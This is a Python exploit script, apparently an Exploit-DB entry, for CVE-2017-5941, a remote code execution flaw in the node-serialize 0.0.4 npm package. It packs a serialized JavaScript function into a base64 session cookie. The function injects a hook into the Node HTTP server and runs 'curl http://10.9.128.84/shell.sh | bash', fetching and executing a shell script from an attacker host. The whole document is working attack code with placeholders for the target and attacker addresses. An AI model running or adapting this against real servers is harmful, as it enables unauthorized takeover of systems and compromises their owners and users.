# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (2)
# Exploit Author: UndeadLarva
# Software Link: https://www.npmjs.com/package/node-serialize
# Version: 0.0.4
# CVE: CVE-2017-5941

import requests
import re
import base64
import sys

url = 'http://10.10.166.184:8080/' # change this

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
"console.log('still inside');"
"const { exec } = require('child_process');"
"exec('curl http://10.9.128.84/shell.sh | bash');" # change this
"}"
"})(require('http').ServerResponse.prototype.end)")

# rce = "_$$ND_FUNC$$_process.exit(0)"
# code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload

string = '{"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "'+code+'"}'

cookie = {'session':base64.b64encode(string)}

try:
    response = requests.get(url, cookies=cookie).text
    print response
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
